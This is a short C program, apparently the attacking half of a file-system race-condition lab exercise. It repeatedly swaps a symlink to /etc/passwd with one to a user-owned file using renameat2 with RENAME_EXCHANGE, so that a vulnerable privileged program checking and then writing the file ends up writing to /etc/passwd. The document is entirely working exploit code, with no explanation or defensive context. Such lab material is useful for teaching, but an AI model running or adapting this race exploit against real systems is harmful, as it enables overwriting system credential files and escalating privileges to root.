#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>

int main() {
  unsigned int flags = RENAME_EXCHANGE;
  unlink("/tmp/XYZ");
  symlink("/home/calvvnono/myfile", "/tmp/XYZ");
  unlink("/home/calvvnono/sflink");
  symlink("/etc/passwd", "/home/calvvnono/sflink"); 
  while(1){
    renameat2(0, "/tmp/XYZ", 0, "/home/calvvnono/sflink", flags);
  }
  return 0;
}

